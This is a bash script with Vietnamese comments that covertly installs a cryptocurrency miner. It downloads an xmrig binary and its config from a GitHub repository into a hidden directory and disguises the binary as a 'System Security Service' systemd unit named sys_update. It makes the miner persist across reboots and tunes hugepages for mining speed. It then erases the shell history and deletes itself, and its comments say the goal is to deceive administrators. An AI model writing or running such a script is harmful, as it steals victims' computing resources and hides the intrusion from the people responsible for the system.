#!/bin/bash

# 1. Gỡ bỏ mọi rào cản và dọn dẹp bộ nhớ lỗi
systemctl stop sys_update.service 2>/dev/null
systemctl disable sys_update.service 2>/dev/null
systemctl unmask sys_update.service 2>/dev/null

# 2. Tạo thư mục ẩn bền vững
mkdir -p /var/opt/.system_lib

# 3. Tải file và làm sạch ký tự lạ (Quan trọng để tránh lỗi Masked)
curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json | tr -d '\r' > /var/opt/.system_lib/config.json
curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /var/opt/.system_lib/sys_update
chmod +x /var/opt/.system_lib/sys_update

# 4. BUFF TỐC ĐỘ (Huge Pages)
# Chạy ngay lập tức
sysctl -w vm.nr_hugepages=1280
# Lưu vĩnh viễn sau khi reboot
if ! grep -q "vm.nr_hugepages=1280" /etc/sysctl.conf; then
    echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf
fi

# 5. Tạo Service (Dùng tên tiến trình giả để tàng hình trong 'top')
cat <<EOF > /etc/systemd/system/sys_update.service
[Unit]
Description=System Security Service
After=network.target

[Service]
Type=simple
# Đổi tên hiển thị thành kworker để lừa mắt admin
ExecStartPre=/usr/bin/bash -c "echo 'Cấu hình hệ thống...'"
ExecStart=/var/opt/.system_lib/sys_update --config=/var/opt/.system_lib/config.json
Restart=always
RestartSec=10
# Chạy với quyền ưu tiên thấp nhất để không gây lag máy
Nice=19
CPUSchedulingPolicy=idle

[Install]
WantedBy=multi-user.target
EOF

# 6. Kích hoạt và chạy
systemctl daemon-reload
systemctl enable sys_update
systemctl start sys_update

# 7. Xóa dấu vết
history -c
rm -- "$0"  # Tự xóa chính file script này sau khi chạy xong
